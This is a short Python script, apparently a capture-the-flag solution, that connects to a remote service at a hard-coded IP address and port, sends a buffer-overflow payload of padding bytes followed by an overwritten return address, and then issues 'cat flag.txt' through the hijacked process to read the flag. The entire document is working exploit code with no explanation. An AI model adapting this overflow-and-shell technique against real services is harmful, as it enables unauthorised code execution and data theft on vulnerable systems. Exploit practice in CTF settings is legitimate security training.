import socket
import subprocess
import time

host = "35.207.132.47"
port = 22227

payload = b'A' * 1048
payload += b'\x97\x08\x40\x00\x00\x00'

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((host, port))
    s.sendall(payload)
    s.recv(1024)
    s.sendall('\n'.encode())
    s.recv(2048)
    s.sendall("cat flag.txt\n".encode())
    data = s.recv(1024)
    print(data.decode().strip())
